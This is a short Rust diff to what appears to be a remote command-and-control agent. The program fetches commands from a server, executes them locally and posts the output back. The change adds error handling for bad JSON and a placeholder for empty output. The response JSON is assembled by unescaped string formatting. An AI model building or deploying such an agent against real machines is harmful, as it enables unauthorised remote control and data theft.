@@ -67,7 +67,17 @@ fn getCommands(identifier:&str){
     };
     let res = format!(r#"{}"#,res);
     print(&res);
-    let res = json::parse(&res).unwrap(); //always will receive json
+    //if the server response contains an error, restart the main loop
+    let res = match json::parse(&res){
+        Ok(ok)=>{
+            ok
+        }, Err(_)=>{
+            print(&"Get_Commands - Can't parse JSON");
+            thread::sleep(sleep_time);
+            return
+        }
+    }; //always will receive json
+
     let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();
     if command_count == 69420{ //special number sent by server indicating there is an error
         main_loop(&get_id(&get_local_ip()));
@@ -158,6 +168,10 @@ fn run_command(cmd: &str) -> String {
 
 fn post_response(cmd_id: &str, response: &str, identifier: &str){
     let responses_url = format!("{}/hosts/{}/response",server_ip, identifier);
+    let mut response = response;
+    if (response.eq("")){
+        response = "Command executed. (No response)"
+    }
     print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
     let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
     let client = reqwest::blocking::Client::builder()
